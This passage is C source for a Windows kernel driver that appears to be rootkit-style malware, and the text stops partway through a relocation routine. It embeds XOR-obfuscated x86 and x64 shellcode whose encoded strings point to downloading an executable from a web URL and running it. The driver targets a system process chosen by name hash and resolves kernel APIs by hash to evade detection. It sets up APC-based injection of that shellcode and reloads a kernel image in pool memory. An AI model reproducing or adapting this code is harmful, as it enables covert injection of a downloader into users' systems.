#include "DrvCfg.h"

#include "Utils.h"
#include "x86Call.h"
#include "ShellCode.h"
//#include "x64Call.h"
#pragma warning(disable:4047)

PFUNCTION_DAT g_pFunctionDat = NULL;
//ULONG_PTR *g_ulNtoskrnlBase = 0;
//ULONG_PTR g_ulNtoskrnlBase = 0;
BOOLEAN g_bInjectProcessFlag = 0;
PVOID g_pInjectBuffer = NULL;

PKAPC pApc = NULL;
//PVOID g_pInjectShellCode = NULL;
#define INJECT_PROCESS_NUM	1
//ULONG g_InjectHashValue[INJECT_PROCESS_NUM] = {
//	0x0a7502a5,			//alg.exe
//	0x1beb0487,			//spoolsv.exe
//	0x3e6d06d6,			//searchindexer.exe
//	0x59a1084a,			//trustedinstaller.exe
//	0x1bba047f,			//wscntfy.exe
//	0x1b8e047b			//svchost.exe
//};
ULONG g_InjectHashValue[INJECT_PROCESS_NUM] = {
	0x208604e2
};

#ifndef _WIN64
ULONG g_ulInjectShellCodeLength = 741;
unsigned char g_pInjectShellCode[741] = {
		0x60, 0xFC, 0x89, 0xE5, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5F, 0x83, 0xEF, 0x09, 0x8D, 0xBF, 0x1E, 
		0x00, 0x00, 0x00, 0xB9, 0xC7, 0x02, 0x00, 0x00, 0x80, 0x37, 0x77, 0x47, 0xE2, 0xFA, 0x9F, 0x18, 
		0x76, 0x77, 0x77, 0xFC, 0x29, 0x4B, 0x76, 0x84, 0x9F, 0x84, 0x77, 0x77, 0x77, 0x22, 0x9F, 0x77, 
		0x77, 0x77, 0x77, 0x2A, 0xF4, 0x9A, 0x62, 0xFA, 0xFA, 0x89, 0x76, 0x77, 0x77, 0x26, 0x88, 0xE2, 
		0x4A, 0x75, 0x77, 0x77, 0xFE, 0xF2, 0x62, 0x75, 0x77, 0x77, 0xFA, 0xE2, 0x7E, 0x75, 0x77, 0x77, 
		0xFE, 0xB6, 0x25, 0x26, 0x88, 0xE2, 0x32, 0x75, 0x77, 0x77, 0x1D, 0x77, 0xFA, 0xE2, 0x9C, 0x76, 
		0x77, 0x77, 0x25, 0xFA, 0xFA, 0xB0, 0x76, 0x77, 0x77, 0x26, 0x1D, 0x77, 0x88, 0xA7, 0xFC, 0xFA, 
		0x62, 0x75, 0x77, 0x77, 0x26, 0x88, 0xE2, 0x36, 0x75, 0x77, 0x77, 0x46, 0x88, 0xFA, 0xFA, 0xDE, 
		0x76, 0x77, 0x77, 0x26, 0x88, 0xE2, 0x4A, 0x75, 0x77, 0x77, 0xFE, 0xF2, 0x6E, 0x75, 0x77, 0x77, 
		0xFA, 0xEA, 0xC3, 0x76, 0x77, 0x77, 0x24, 0x27, 0x88, 0xE2, 0x32, 0x75, 0x77, 0x77, 0xFE, 0xF2, 
		0x26, 0x75, 0x77, 0x77, 0x30, 0xF4, 0x88, 0x27, 0x04, 0x16, 0x1F, 0xFF, 0x64, 0x77, 0x77, 0x88, 
		0xE2, 0x3A, 0x75, 0x77, 0x77, 0x1D, 0x77, 0x1D, 0x77, 0xFA, 0xE2, 0x9C, 0x76, 0x77, 0x77, 0x25, 
		0xFA, 0xFA, 0xB0, 0x76, 0x77, 0x77, 0x26, 0x1D, 0x77, 0x88, 0xE2, 0x26, 0x75, 0x77, 0x77, 0xF4, 
		0x8F, 0x77, 0x02, 0xA7, 0xFA, 0xE2, 0x2E, 0x75, 0x77, 0x77, 0x25, 0xFA, 0xFA, 0x1E, 0x75, 0x77, 
		0x77, 0xB0, 0x76, 0x33, 0x77, 0x77, 0x77, 0x26, 0x1D, 0x77, 0x1D, 0x77, 0x1F, 0x77, 0x77, 0x77, 
		0x7F, 0x1D, 0x77, 0x1D, 0x77, 0x1D, 0x77, 0xFA, 0xEA, 0x9C, 0x76, 0x77, 0x77, 0x24, 0x1D, 0x77, 
		0x88, 0xE2, 0x22, 0x75, 0x77, 0x77, 0xF4, 0x8F, 0x77, 0x03, 0xEE, 0xFA, 0xC2, 0x6E, 0x75, 0x77, 
		0x77, 0x21, 0x88, 0xE2, 0x36, 0x75, 0x77, 0x77, 0x2A, 0xFE, 0x9B, 0x9E, 0xDC, 0x76, 0x77, 0x77, 
		0x17, 0xFC, 0x24, 0x0F, 0x76, 0x85, 0x46, 0xAC, 0xFC, 0x3D, 0x57, 0x76, 0x86, 0xFC, 0x35, 0x6B, 
		0x76, 0x87, 0xFC, 0x0D, 0x6F, 0xFC, 0x1D, 0x53, 0x76, 0x82, 0xFC, 0x66, 0x76, 0x85, 0x27, 0x24, 
		0x11, 0xFC, 0x2B, 0x2A, 0x77, 0xF6, 0x94, 0x88, 0x88, 0x77, 0x77, 0xFC, 0x73, 0xEF, 0x76, 0x87, 
		0x9F, 0x7C, 0x77, 0x77, 0x77, 0x2C, 0x2F, 0xF4, 0xB6, 0x73, 0x34, 0x38, 0x02, 0xAB, 0x16, 0xB4, 
		0x17, 0xFE, 0xB4, 0x9F, 0x48, 0x77, 0x77, 0x77, 0xFE, 0xB5, 0x9F, 0x77, 0x77, 0x77, 0x77, 0x2A, 
		0xF6, 0x9A, 0x26, 0x76, 0x77, 0x77, 0xFA, 0xC2, 0x6A, 0x75, 0x77, 0x77, 0xFA, 0xCA, 0x4E, 0x75, 
		0x77, 0x77, 0xF4, 0xB0, 0x73, 0xDA, 0xF2, 0xB7, 0x03, 0x71, 0x4E, 0xA7, 0x02, 0x83, 0xFE, 0x68, 
		0x16, 0xB4, 0xCD, 0x47, 0x77, 0x77, 0x77, 0x13, 0xFC, 0x45, 0xFC, 0x01, 0x7B, 0xFC, 0x01, 0x7B, 
		0xDA, 0xFC, 0x47, 0xFC, 0x01, 0x6F, 0xB4, 0x26, 0x24, 0x25, 0x46, 0xBE, 0x46, 0xB7, 0x46, 0xAC, 
		0x37, 0xFD, 0x7D, 0xF3, 0xBE, 0x03, 0x70, 0x76, 0xBF, 0x76, 0xB4, 0x35, 0x9C, 0x84, 0xB6, 0x94, 
		0x67, 0x7E, 0xAF, 0x2D, 0x2C, 0x2E, 0xB4, 0x02, 0x05, 0x1B, 0x1A, 0x18, 0x19, 0x59, 0x13, 0x1B, 
		0x1B, 0x77, 0x22, 0x25, 0x3B, 0x33, 0x18, 0x00, 0x19, 0x1B, 0x18, 0x16, 0x13, 0x23, 0x18, 0x31, 
		0x1E, 0x1B, 0x12, 0x36, 0x77, 0x1F, 0x03, 0x03, 0x07, 0x4D, 0x58, 0x58, 0x13, 0x59, 0x40, 0x5A, 
		0x0D, 0x1E, 0x07, 0x59, 0x18, 0x05, 0x10, 0x58, 0x16, 0x58, 0x40, 0x0D, 0x46, 0x40, 0x47, 0x47, 
		0x5A, 0x0F, 0x41, 0x43, 0x59, 0x12, 0x0F, 0x12, 0x77, 0x20, 0x1E, 0x19, 0x13, 0x18, 0x00, 0x04, 
		0x24, 0x03, 0x16, 0x03, 0x1E, 0x18, 0x19, 0x59, 0x12, 0x0F, 0x12, 0x77, 0x02, 0x04, 0x12, 0x05, 
		0x44, 0x45, 0x59, 0x13, 0x1B, 0x1B, 0x77, 0x3A, 0x12, 0x04, 0x04, 0x16, 0x10, 0x12, 0x35, 0x18, 
		0x0F, 0x36, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0xE0, 0x73, 0xF6, 0x6A, 0x2F, 
		0x73, 0x85, 0x6F, 0x0C, 0x72, 0xB0, 0x50, 0xC3, 0x75, 0xDA, 0x7D, 0x8D, 0x76, 0xCA, 0x72, 0xC7, 
		0x71, 0x4E, 0x48, 0x02, 0x72, 0xCE, 0x5F, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x9F, 0x77, 0x77, 0x77, 0x77, 
		0x2F, 0xFA, 0xCF, 0x39, 0x8A, 0x88, 0x88, 0xCE, 0xDA, 0x75, 0x77, 0x77, 0x46, 0xB7, 0x84, 0xDD, 
		0x16, 0xB5, 0x7B, 0x77, 0x00
	};
#else
ULONG g_ulInjectShellCodeLength = 998;
unsigned char g_pInjectShellCode[998] = {
		0xE8, 0x00, 0x00, 0x00, 0x00, 0x5A, 0x48, 0x83, 0xEA, 0x05, 0x48, 0x8D, 0xBA, 0x1E, 0x00, 0x00, 
		0x00, 0xB9, 0xC8, 0x03, 0x00, 0x00, 0x80, 0x37, 0x77, 0x48, 0xFF, 0xC7, 0xE2, 0xF8, 0x24, 0x22, 
		0x20, 0x21, 0x36, 0x23, 0x36, 0x22, 0x36, 0x21, 0x36, 0x20, 0x3F, 0xFE, 0x92, 0x3F, 0xF4, 0x93, 
		0x87, 0x9F, 0x2B, 0x76, 0x77, 0x77, 0x3F, 0xFE, 0x87, 0x9F, 0x06, 0x76, 0x77, 0x77, 0x9F, 0x77, 
		0x77, 0x77, 0x77, 0x36, 0x28, 0x3E, 0xF4, 0x98, 0x52, 0x3F, 0xF4, 0x9B, 0x57, 0x3E, 0xFA, 0xF8, 
		0xD3, 0x75, 0x77, 0x77, 0x36, 0x88, 0xE0, 0x9C, 0x75, 0x77, 0x77, 0x36, 0xFE, 0xF0, 0xCC, 0x75, 
		0x77, 0x77, 0x3F, 0xF4, 0xB3, 0x57, 0x3F, 0xF4, 0x9B, 0x27, 0x3F, 0xFE, 0xB6, 0x3E, 0xFA, 0xE0, 
		0xD8, 0x75, 0x77, 0x77, 0x36, 0x88, 0xE0, 0x8C, 0x75, 0x77, 0x77, 0x3A, 0x46, 0xBE, 0x3A, 0xFA, 
		0xF0, 0xE6, 0x75, 0x77, 0x77, 0x3E, 0xFA, 0xE0, 0x1A, 0x75, 0x77, 0x77, 0x3F, 0x46, 0xBE, 0x88, 
		0xA7, 0x3F, 0xF4, 0xB3, 0x27, 0x3E, 0xFC, 0xF8, 0xCC, 0x75, 0x77, 0x77, 0x36, 0x88, 0xE0, 0x84, 
		0x75, 0x77, 0x77, 0x46, 0x88, 0x3E, 0xFA, 0xF8, 0x38, 0x75, 0x77, 0x77, 0x36, 0x88, 0xE0, 0x9C, 
		0x75, 0x77, 0x77, 0x3E, 0xFE, 0xF0, 0xB4, 0x75, 0x77, 0x77, 0x3E, 0xFA, 0xE0, 0x2D, 0x75, 0x77, 
		0x77, 0x3F, 0xFE, 0xB6, 0x36, 0x88, 0xE0, 0x8C, 0x75, 0x77, 0x77, 0x3E, 0xFE, 0xF0, 0x64, 0x74, 
		0x77, 0x77, 0x88, 0xB0, 0xF4, 0x88, 0x27, 0x78, 0xF4, 0xE8, 0x77, 0x77, 0x77, 0xCE, 0xFF, 0x64, 
		0x77, 0x77, 0x36, 0x88, 0xE0, 0x7C, 0x74, 0x77, 0x77, 0x3F, 0xB0, 0x33, 0x53, 0x57, 0x77, 0x77, 
		0x77, 0x77, 0x32, 0x46, 0xBE, 0x3A, 0xFA, 0xF0, 0xE6, 0x75, 0x77, 0x77, 0x3E, 0xFA, 0xE0, 0x1A, 
		0x75, 0x77, 0x77, 0x3F, 0x46, 0xBE, 0x36, 0x88, 0xE0, 0x64, 0x74, 0x77, 0x77, 0xF4, 0x8F, 0x77, 
		0x02, 0xB7, 0x3F, 0xF4, 0x9B, 0x27, 0x3F, 0xB0, 0x33, 0x53, 0x57, 0x77, 0x77, 0x77, 0x77, 0xB0, 
		0x33, 0x53, 0x5F, 0x77, 0x77, 0x77, 0x7F, 0x3F, 0xB0, 0x33, 0x53, 0x47, 0x77, 0x77, 0x77, 0x77, 
		0x3F, 0xB0, 0x33, 0x53, 0x4F, 0x77, 0x77, 0x77, 0x77, 0x3A, 0xFA, 0xE0, 0x4C, 0x74, 0x77, 0x77, 
		0x3B, 0xFE, 0x23, 0x53, 0x37, 0x3A, 0xFA, 0xE0, 0x54, 0x74, 0x77, 0x77, 0x36, 0xB0, 0x75, 0x1F, 
		0x77, 0x77, 0x77, 0x3B, 0xFE, 0x23, 0x53, 0x3F, 0x3A, 0x46, 0xBE, 0x3A, 0x46, 0xB7, 0x3E, 0xFA, 
		0xE0, 0xE6, 0x75, 0x77, 0x77, 0x3F, 0x46, 0xBE, 0x36, 0x88, 0xE0, 0x6C, 0x74, 0x77, 0x77, 0x3F, 
		0xF4, 0xB3, 0x27, 0xF4, 0x8F, 0x77, 0x78, 0xF3, 0x21, 0x88, 0x88, 0x88, 0x3E, 0xFC, 0xF8, 0xB4, 
		0x75, 0x77, 0x77, 0x36, 0x88, 0xE0, 0x84, 0x75, 0x77, 0x77, 0x3F, 0xFE, 0x9B, 0x9E, 0x58, 0x75, 
		0x77, 0x77, 0xE7, 0xCE, 0x17, 0x77, 0x77, 0x77, 0x12, 0x3F, 0xFC, 0x46, 0x3F, 0xFC, 0x01, 0x6F, 
		0x3F, 0xFC, 0x01, 0x47, 0x3F, 0xFC, 0x41, 0x3F, 0xFC, 0x41, 0x3F, 0xFC, 0x01, 0x67, 0xB4, 0x22, 
		0x3F, 0xFE, 0xB1, 0xFC, 0x39, 0x4B, 0x3F, 0x76, 0x86, 0xFC, 0xE6, 0xFF, 0x77, 0x77, 0x77, 0x3F, 
		0x76, 0x85, 0x26, 0xFC, 0x3D, 0x57, 0x3F, 0x76, 0x86, 0x33, 0xFC, 0x05, 0x6B, 0x3E, 0x76, 0x81, 
		0xFC, 0x0D, 0x6F, 0xFC, 0x1D, 0x53, 0x3F, 0x76, 0x82, 0x3A, 0x46, 0xB7, 0xFC, 0x66, 0x3F, 0x76, 
		0x85, 0x11, 0x35, 0xFC, 0x2B, 0x32, 0x77, 0xF6, 0x94, 0x88, 0x88, 0x77, 0x77, 0x36, 0xFC, 0x73, 
		0xE9, 0x3F, 0x76, 0x87, 0x9F, 0x79, 0x77, 0x77, 0x77, 0x3F, 0xF4, 0xB6, 0x73, 0x3E, 0x88, 0xB7, 
		0x88, 0xB8, 0x02, 0xAF, 0x2D, 0x2A, 0xB4, 0x9F, 0x4D, 0x77, 0x77, 0x77, 0x9F, 0x77, 0x77, 0x77, 
		0x77, 0x36, 0x28, 0x3E, 0xF6, 0x98, 0x84, 0x76, 0x77, 0x77, 0x3A, 0xFA, 0xE8, 0xBC, 0x75, 0x77, 
		0x77, 0x3A, 0xFA, 0xD8, 0x9C, 0x75, 0x77, 0x77, 0x3E, 0xB0, 0xB3, 0x8B, 0x88, 0x88, 0x88, 0x3E, 
		0xF4, 0xB3, 0x73, 0x34, 0xF4, 0x4B, 0x54, 0x77, 0x03, 0x7C, 0x30, 0x4E, 0x7B, 0x54, 0x02, 0x98, 
		0x3C, 0xFE, 0x33, 0x12, 0x77, 0xB4, 0x32, 0x46, 0xBE, 0x32, 0x46, 0xA5, 0x36, 0x88, 0xB6, 0x32, 
		0x46, 0xAC, 0x33, 0xFD, 0x6D, 0x32, 0xF3, 0xAC, 0x03, 0x7C, 0x32, 0x76, 0xAE, 0x32, 0x76, 0xBD, 
		0x3F, 0x88, 0xB5, 0x9C, 0x9A, 0x36, 0xB6, 0x95, 0x67, 0x32, 0x7E, 0xA6, 0xB4, 0x02, 0x05, 0x1B, 
		0x1A, 0x18, 0x19, 0x59, 0x13, 0x1B, 0x1B, 0x77, 0x22, 0x25, 0x3B, 0x33, 0x18, 0x00, 0x19, 0x1B, 
		0x18, 0x16, 0x13, 0x23, 0x18, 0x31, 0x1E, 0x1B, 0x12, 0x36, 0x77, 0x1F, 0x03, 0x03, 0x07, 0x4D, 
		0x58, 0x58, 0x13, 0x59, 0x40, 0x5A, 0x0D, 0x1E, 0x07, 0x59, 0x18, 0x05, 0x10, 0x58, 0x16, 0x58, 
		0x40, 0x0D, 0x46, 0x40, 0x47, 0x47, 0x5A, 0x0F, 0x41, 0x43, 0x59, 0x12, 0x0F, 0x12, 0x77, 0x20, 
		0x1E, 0x19, 0x13, 0x18, 0x00, 0x04, 0x24, 0x03, 0x16, 0x03, 0x1E, 0x18, 0x19, 0x59, 0x12, 0x0F, 
		0x12, 0x77, 0x02, 0x04, 0x12, 0x05, 0x44, 0x45, 0x59, 0x13, 0x1B, 0x1B, 0x77, 0x3A, 0x12, 0x04, 
		0x04, 0x16, 0x10, 0x12, 0x35, 0x18, 0x0F, 0x36, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0xE0, 0x73, 0xF6, 0x6A, 0x2F, 0x73, 0x85, 
		0x6F, 0x0C, 0x72, 0xB0, 0x50, 0xC3, 0x75, 0xDA, 0x7D, 0x8D, 0x76, 0xCA, 0x72, 0xC7, 0x71, 0x4E, 
		0x48, 0x02, 0x72, 0xCE, 0x5F, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
		0x77, 0x9F, 0x77, 0x77, 0x77, 0x77, 0x2F, 0x3F, 0xFA, 0xCF, 0x2F, 0x8B, 0x88, 0x88, 0xCE, 0xD4, 
		0x74, 0x77, 0x77, 0x3F, 0x46, 0xB7, 0x84, 0xDD, 0x36, 0x28, 0x36, 0x29, 0x36, 0x2A, 0x36, 0x2B, 
		0x29, 0x28, 0x2A, 0x2C, 0xB4, 0x00
	};
#endif

void InitializeFunctionDat(PFUNCTION_DAT pFunctionDat)
{
	pFunctionDat->My_PsSetLoadImageNotifyRoutine = 0;
	pFunctionDat->My_PsSetLoadImageNotifyRoutine_HashValue = 0x91E40AB2;

	//g_pFunctionDat->My_ZwCreateFile = 0;
	//g_pFunctionDat->My_ZwCreateFile_HashValue = 0x1E1104A6;

	//g_pFunctionDat->My_ZwWriteFile = 0;
	//g_pFunctionDat->My_ZwWriteFile_HashValue = 0x1A4E045D;

	pFunctionDat->My_ZwClose = 0;
	pFunctionDat->My_ZwClose_HashValue = 0x0ADE02C8;

	pFunctionDat->My_ZwQuerySystemInformation = 0;
	pFunctionDat->My_ZwQuerySystemInformation_HashValue = 0x7B6E09F3;

	pFunctionDat->My_ExAllocatePoolWithTag = 0;
	pFunctionDat->My_ExAllocatePoolWithTag_HashValue = 0x594D0835;

	pFunctionDat->My_ExFreePoolWithTag = 0;
	pFunctionDat->My_ExFreePoolWithTag_HashValue = 0x3a460692;

	pFunctionDat->My_ObReferenceObjectByHandle = 0;
	pFunctionDat->My_ObReferenceObjectByHandle_HashValue = 0x7BE9099F;

	pFunctionDat->My_ObDereferenceObject = 0;
	pFunctionDat->My_ObDereferenceObject_HashValue = 0x482C0761;

	pFunctionDat->My_PsCreateSystemThread = 0;
	pFunctionDat->My_PsCreateSystemThread_HashValue = 0x528607F5;

	pFunctionDat->My_KeWaitForSingleObject = 0;
	pFunctionDat->My_KeWaitForSingleObject_HashValue = 0x57E00826;

	pFunctionDat->My_PsTerminateSystemThread = 0;
	pFunctionDat->My_PsTerminateSystemThread_HashValue = 0x6EFB094A;

	pFunctionDat->My_MmCreateMdl = 0;
	pFunctionDat->My_MmCreateMdl_HashValue = 0x1883042C;

	pFunctionDat->My_MmBuildMdlForNonPagedPool = 0;
	pFunctionDat->My_MmBuildMdlForNonPagedPool_HashValue = 0x7A9A0995;

	pFunctionDat->My_MmMapLockedPages = 0;
	pFunctionDat->My_MmMapLockedPages_HashValue = 0x32B4061B;

	pFunctionDat->My_MmUnmapLockedPages = 0;
	pFunctionDat->My_MmUnmapLockedPages_HashValue = 0x41AC06FE;

	pFunctionDat->My_PsGetCurrentProcess = 0;
	pFunctionDat->My_PsGetCurrentProcess_HashValue = 0x4A5007A6;

	pFunctionDat->My_IoGetCurrentProcess = 0;
	pFunctionDat->My_IoGetCurrentProcess_HashValue = 0x4983079B;

	pFunctionDat->My_KeStackAttachProcess = 0;
	pFunctionDat->My_KeStackAttachProcess_HashValue = 0x500907DB;

	pFunctionDat->My_ZwAllocateVirtualMemory = 0;
	pFunctionDat->My_ZwAllocateVirtualMemory_HashValue = 0x6DE90957;

	pFunctionDat->My_KeUnstackDetachProcess = 0;
	pFunctionDat->My_KeUnstackDetachProcess_HashValue = 0x61EC08B2;

	pFunctionDat->My_PsLookupProcessByProcessId = 0;
	pFunctionDat->My_PsLookupProcessByProcessId_HashValue = 0x8C620A64;

	pFunctionDat->My_KeInitializeApc = 0;
	pFunctionDat->My_KeInitializeApc_HashValue = 0x2E0105D7;

	pFunctionDat->My_KeInsertQueueApc = 0;
	pFunctionDat->My_KeInsertQueueApc_HashValue = 0x347E063F;

	pFunctionDat->My_KeGetCurrentThread = 0;
	pFunctionDat->My_KeGetCurrentThread_HashValue = 0x4143070C;

	pFunctionDat->My_PsRemoveLoadImageNotifyRoutine = 0;
	pFunctionDat->My_PsRemoveLoadImageNotifyRoutine_HashValue = 0xB5DC0BF4;

	pFunctionDat->My_PsGetProcessImageFileName = 0;
	pFunctionDat->My_PsGetProcessImageFileName_HashValue = 0x7D6B09A7;


	//pFunctionDat->My_Wcsstr = 0;
	//pFunctionDat->My_Wcsstr_HashValue = 0x093E02A7;

	pFunctionDat->ulEndApiSaveAddress = 0;
	pFunctionDat->ulEndApiHashValue = 0;
}
// 计算对齐后的大小   
unsigned long GetAlignedSize(unsigned long Origin, unsigned long Alignment)   
{   
	return (Origin + Alignment - 1) / Alignment * Alignment;   
} 
ULONG Initialize_Reload(EXALLOCATEPOOLWITHTAG MyExAllocatePoolWithTag,PUCHAR pBaseAddr)
{
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNtHeader;
	PIMAGE_SECTION_HEADER pSectionHeader;
	PIMAGE_DATA_DIRECTORY pRelocTable;
	PIMAGE_BASE_RELOCATION pRelocBlock;
	//ULONG ulSizeOfHeaders;
	ULONG ulSizeOfImage;
	PUCHAR pNewBaseAddress;
	PVOID pTmp;
	ULONG uli;
	ULONG ulRelocCnt;
//#ifndef _WIN64
	ULONG_PTR ulPageOffset;
	USHORT *uOffsetTable;
//#endif
	ULONG_PTR ulOffset;
	ULONG *ulSearchCode;
	PIMAGE_RELOC pImageReloc;

	ulSizeOfImage = 0;
	pRelocTable = NULL;
	pRelocBlock = NULL;
	pImageReloc = NULL;
	uOffsetTable = NULL;
	pTmp = NULL;

	pDosHeader = (PIMAGE_DOS_HEADER)pBaseAddr;
	pNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pDosHeader + pDosHeader->e_lfanew);
	ulSizeOfImage = pNtHeader->OptionalHeader.SizeOfImage * 3;
	pNewBaseAddress = (PUCHAR)MyExAllocatePoolWithTag(NonPagedPool,ulSizeOfImage,'vdkF');
	if (NULL == pNewBaseAddress)
	{
		return 0;
	}
	CleanZero(pNewBaseAddress,ulSizeOfImage);
	ulOffset = (ULONG_PTR)pNewBaseAddress - pNtHeader->OptionalHeader.ImageBase;

	//MyMemcpy((PCHAR)pNewBaseAddress, \
	//	(PCHAR)pDosHeader, \
	//	pNtHeader->OptionalHeader.SizeOfHeaders);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pNtHeader + \
		sizeof(ULONG) +  \
		sizeof(IMAGE_FILE_HEADER) + \
		pNtHeader->FileHeader.SizeOfOptionalHeader);
	for (uli = 0;uli < pNtHeader->FileHeader.NumberOfSections;uli++)
	{
		MyMemcpy((PCHAR)((ULONG_PTR)pNewBaseAddress + pSectionHeader[uli].VirtualAddress), \
			(PCHAR)((ULONG_PTR)pBaseAddr + pSectionHeader[uli].PointerToRawData), \
			pSectionHeader[uli].SizeOfRawData);
	}
	//for (uli = 0;uli < pNtHeader->FileHeader.NumberOfSections;uli++)
	//{
	//	if (pSectionHeader[uli].VirtualAddress)
	//	{
	//		pTmp = (PVOID)((ULONG_PTR)pNewBaseAddress + pSectionHeader[uli].VirtualAddress);
	//	}
	//	if (pSectionHeader[uli].SizeOfRawData)
	//	{
	//		MyMemcpy((PCHAR)pTmp, \
	//			(PCHAR)((ULONG_PTR)pBaseAddr + pSectionHeader[uli].PointerToRawData), \
	//			pSectionHeader[uli].SizeOfRawData);

	//		if (pSectionHeader[uli].Misc.VirtualSize < pSectionHeader[uli].SizeOfRawData)
	//		{
	//			pTmp = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pTmp + \
	//				GetAlignedSize(pSectionHeader[uli].SizeOfRawData, \
	//				pNtHeader->OptionalHeader.SectionAlignment));
	//		}
	//		else
	//		{
	//			pTmp = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pTmp + \
	//				GetAlignedSize(pSectionHeader[uli].Misc.VirtualSize, \
	//				pNtHeader->OptionalHeader.SectionAlignment));
	//		}
	//	}
	//	else
	//	{
	//		pTmp = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pTmp + \
	//			GetAlignedSize(pSectionHeader[uli].Misc.VirtualSize, \
	//			pNtHeader->OptionalHeader.SectionAlignment));
	//	}
	//}
#ifndef _WIN64
	if (pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
	{
		pRelocBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pNewBaseAddress +  \
			pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		while (pRelocBlock->SizeOfBlock)
		{
			uOffsetTable = (USHORT *)&pRelocBlock[1];
			ulRelocCnt = (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
			for (uli = 0;uli < ulRelocCnt;uli++)
			{
				ulPageOffset = uOffsetTable[uli];
				if ((ulPageOffset & 0xF000) != 0x3000)
				{
					continue;
				}
				ulPageOffset &= 0xFFF;
				ulPageOffset += (ULONG_PTR)((ULONG_PTR)pNewBaseAddress + pRelocBlock->VirtualAddress);
				(*(ULONG_PTR*)ulPageOffset) += ulOffset;
			}
			pRelocBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRelocBlock + pRelocBlock->SizeOfBlock);
		}
	}
#else
	if (pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 && \
		pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size != 0)
	{
		pRelocBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pNewBaseAddress +  \
			pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		while (pRelocBlock->SizeOfBlock && \
			pRelocBlock->SizeOfBlock < 0xFFFF)
		{
			pImageReloc = (PIMAGE_RELOC)&pRelocBlock[1];
			ulRelocCnt = (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
			for (uli = 0;uli < ulRelocCnt;uli++)
			{
				//IMAGE_REL_BASED_DIR64
				ulPageOffset = uOffsetTable[uli];
				if ((ulPageOffset & 0xF000) != 0xA000)
				{
					continue;
				}
				ulPageOffset &= 0xFFF;
				ulPageOffset += (ULONG_PTR)((ULONG_PTR)pNewBaseAddress + pRelocBlock->VirtualAddress);
				(*(ULONG_PTR*)ulPageOffset) += ulOffset;
